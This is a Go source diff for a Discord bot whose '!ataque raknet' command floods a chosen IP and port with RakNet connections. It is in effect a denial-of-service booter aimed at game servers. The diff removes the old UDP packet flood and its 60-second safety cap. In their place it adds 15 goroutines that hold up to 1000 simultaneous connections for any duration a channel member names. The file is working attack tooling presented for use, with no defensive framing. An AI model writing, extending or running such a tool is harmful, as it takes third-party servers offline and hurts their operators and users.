@@ -3,84 +3,93 @@ package main
 import (
 	"bufio"
 	"fmt"
-	"log"
-	"net"
+	"github.com/bwmarrin/discordgo"
+	"github.com/sandertv/go-raknet"
+	"github.com/sirupsen/logrus"
 	"os"
 	"os/signal"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
-
-	"github.com/bwmarrin/discordgo"
-)
-
-const (
-	RaknetMagic = "\x00\xFF\xFF\x00\xFE\xFE\xFE\xFE\xFE\x03\xFA\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\x00\xFE\xFE\xFE\xFE\xFE\x03\xFA\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 )
 
 var (
 	Token string
 )
 
+var mu sync.Mutex
+var connId = 0
+var connections = map[int]*raknet.Conn{}
+var log = logrus.New()
+var target string
+var maxConn = 1000 // Default connections
+var attackDuration time.Duration
+
 func main() {
-	// 1. Obtener el token del bot y guardarlo en token.txt.
+	log.Formatter = &logrus.TextFormatter{ForceColors: true}
+
+	// Get token and save to file
 	err := getToken()
 	if err != nil {
-		log.Fatalf("Error obteniendo el token: %v", err)
+		log.Fatalf("Error getting token: %v", err)
 		return
 	}
 
-	// 2. Crear la sesión de Discord.
+	// Create a new Discord session using the provided bot token.
 	dg, err := discordgo.New("Bot " + Token)
 	if err != nil {
-		log.Fatalf("Error creando la sesión de Discord: %v", err)
+		log.Fatalf("Error creating Discord session: %v", err)
 		return
 	}
 
-	// 3. Registrar el handler para los mensajes.
+	// Register the messageCreate func as a callback for MessageCreate events.
 	dg.AddHandler(messageCreate)
 
-	// 4. Abrir una conexión websocket con Discord.
+	// Only care about receiving message events.
+	dg.Identify.Intents = discordgo.IntentsGuildMessages
+
+	// Open a websocket connection to Discord and begin listening.
 	err = dg.Open()
 	if err != nil {
-		log.Fatalf("Error abriendo la conexión de Discord: %v", err)
+		log.Fatalf("Error opening connection: %v", err)
 		return
 	}
 
-	// Esperar una señal de interrupción (CTRL+C) para cerrar la conexión.
-	fmt.Println("El bot está en ejecución. Presiona CTRL+C para detenerlo.")
+	// Wait here until CTRL-C or other term signal is received.
+	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
 	sc := make(chan os.Signal, 1)
 	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
 	<-sc
 
-	// Cerrar la sesión de Discord.
+	// Cleanly close down the Discord session.
 	dg.Close()
 }
 
 func getToken() error {
-	// Intentar leer el token desde token.txt
+	// Attempt to read the token from token.txt
 	token, err := readTokenFromFile("token.txt")
 	if err == nil && token != "" {
 		Token = token
-		fmt.Println("Token leído desde token.txt")
+		fmt.Println("Token read from token.txt")
 		return nil
 	}
 
-	// Si no existe o está vacío, solicitarlo al usuario.
+	// If it doesn't exist or is empty, request it from the user.
 	reader := bufio.NewReader(os.Stdin)
-	fmt.Print("Por favor, ingresa el token del bot de Discord: ")
+	fmt.Print("Please enter the Discord bot token: ")
 	token, _ = reader.ReadString('\n')
 	token = strings.TrimSpace(token)
 
 	if token == "" {
-		return fmt.Errorf("no se proporcionó un token")
+		return fmt.Errorf("no token provided")
 	}
 
-	// Guardar el token en token.txt
+	// Save the token to token.txt
 	err = saveTokenToFile("token.txt", token)
 	if err != nil {
-		log.Printf("Advertencia: No se pudo guardar el token en token.txt: %v", err)
+		log.Printf("Warning: Failed to save token to token.txt: %v", err)
 	}
 
 	Token = token
@@ -106,81 +115,108 @@ func saveTokenToFile(filename string, token string) error {
 	return err
 }
 
-// REEMPLAZA LA FUNCIÓN messageCreate() ORIGINAL CON ESTA VERSIÓN CORREGIDA
+// This function will be called (due to AddHandler above) every time a new
+// message is created on any channel that the authenticated bot has access to.
 func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
-	// Ignorar los mensajes del propio bot.
+	// Ignore all messages created by the bot itself
+	// This isn't required in every example, but it's a good practice.
 	if m.Author.ID == s.State.User.ID {
 		return
 	}
 
-	// Dividir el mensaje en comandos y argumentos.
+	// Split the message into command and arguments
 	parts := strings.Split(m.Content, " ")
-	if len(parts) == 0 {
-		return
-	}
 
-	// Manejar el comando !ataque raknet.
-	if parts[0] == "!ataque" {
-		if len(parts) < 2 { // Verificación adicional
-			s.ChannelMessageSend(m.ChannelID, "Uso: !ataque raknet <ip> <puerto> <time>")
+	// Check if the message starts with the "!ataque raknet" command
+	if len(parts) >= 5 && parts[0] == "!ataque" && parts[1] == "raknet" {
+		ip := parts[2]
+		portStr := parts[3]
+		timeStr := parts[4]
+
+		port, err := strconv.Atoi(portStr)
+		if err != nil {
+			s.ChannelMessageSend(m.ChannelID, "Invalid port number. Please provide a valid integer.")
 			return
 		}
 
-		if parts[1] == "raknet" {
-			if len(parts) != 5 {
-				s.ChannelMessageSend(m.ChannelID, "Uso: !ataque raknet <ip> <puerto> <time>")
-				return
-			}
-
-			ip := parts[2]
-			port, err := strconv.Atoi(parts[3])
-			if err != nil {
-				s.ChannelMessageSend(m.ChannelID, "El puerto debe ser un número válido")
-				return
-			}
-			duration, err := strconv.Atoi(parts[4])
-			if err != nil {
-				s.ChannelMessageSend(m.ChannelID, "El tiempo debe ser un número válido")
-				return
-			}
-
-			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Atacando %s:%d durante %d segundos...", ip, port, duration))
-			go raknetAttack(ip, port, duration, s, m.ChannelID) // ejecutar el ataque en una goroutine para no bloquear el bot
-		} else {
-			s.ChannelMessageSend(m.ChannelID, "Uso: !ataque raknet <ip> <puerto> <time>")
+		duration, err := strconv.Atoi(timeStr)
+		if err != nil {
+			s.ChannelMessageSend(m.ChannelID, "Invalid duration. Please provide a valid integer for the attack duration in seconds.")
 			return
 		}
+		attackDuration = time.Duration(duration) * time.Second
+
+		target = ip + ":" + strconv.Itoa(port)
+
+		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Initiating RakNet attack on %s for %d seconds with %d connections...", target, duration, maxConn))
+
+		go startAttack(s, m.ChannelID)
 	}
 }
 
+func startAttack(s *discordgo.Session, channelID string) {
 
-func raknetAttack(ip string, port int, duration int, s *discordgo.Session, channelID string) {
-	// Validar el tiempo.  Importante para evitar ataques demasiado largos.
-	if duration > 60 { // Limitar a 60 segundos para seguridad.
-		s.ChannelMessageSend(channelID, "El tiempo máximo de ataque es de 60 segundos")
-		return
+	var wg sync.WaitGroup
+	for i := 0; i < 15; i++ {
+		wg.Add(1)
+		go func(i int) {
+			defer wg.Done()
+			for {
+				select {
+				case <-time.After(attackDuration):
+					log.Infof("Attack duration complete for routine %d", i)
+					return // Exit the goroutine when duration is complete
+				default:
+					err := createConn(i, s, channelID)
+					if err != nil {
+						log.Errorf("Routine %d: %v", i, err)
+
+						// Send error to Discord channel, limiting frequency to avoid spamming
+						s.ChannelMessageSend(channelID, fmt.Sprintf("Error en la rutina %d: %v", i, err))
+						time.Sleep(5 * time.Second) // Adjust the sleep duration
+						continue
+					}
+				}
+			}
+		}(i) // Pass the loop variable i to the goroutine
 	}
 
-	endTime := time.Now().Add(time.Duration(duration) * time.Second)
+	wg.Wait() // Wait for all connection creation routines to complete
+	s.ChannelMessageSend(channelID, "RakNet attack completed")
 
-	for time.Now().Before(endTime) {
-		conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
-		if err != nil {
-			log.Println("Error conectando:", err)
-			s.ChannelMessageSend(channelID, fmt.Sprintf("Error al conectar: %v", err))  // reportar errores
-			return // Detener el ataque si hay un error crítico
-		}
-		defer conn.Close()
+}
 
-		_, err = conn.Write([]byte(RaknetMagic))
-		if err != nil {
-			log.Println("Error enviando el paquete Raknet:", err)
-			s.ChannelMessageSend(channelID, fmt.Sprintf("Error al enviar el paquete: %v", err)) // reportar errores
-			return // Detener el ataque si hay un error crítico
-		}
-
-		// Pausa breve para evitar saturación del sistema.  Importante.
-		time.Sleep(10 * time.Millisecond)
+func createConn(t int, s *discordgo.Session, channelID string) error {
+	for len(connections) >= maxConn {
+		time.Sleep(time.Second * 5)
 	}
-	s.ChannelMessageSend(channelID, fmt.Sprintf("Ataque a %s:%d finalizado.", ip, port))
+
+	log.Infof("[%d] Creating connection to %s...", t, target)
+	conn, err := raknet.Dial(target)
+	if err != nil {
+		return err
+	}
+	mu.Lock()
+	connId++
+	cId := connId
+	connections[cId] = conn
+	log.Infof("[%d] Created connection %s [%d]", t, conn.RemoteAddr(), len(connections))
+	mu.Unlock()
+	go func() {
+		for {
+			_, err := conn.ReadPacket()
+			if err != nil {
+				log.Error(err)
+				_ = conn.Close()
+
+				mu.Lock()
+				delete(connections, cId)
+				log.Infof("Closed %s", conn.RemoteAddr())
+				mu.Unlock()
+				return
+			}
+			time.Sleep(time.Millisecond * 100)
+		}
+	}()
+	return nil
 }
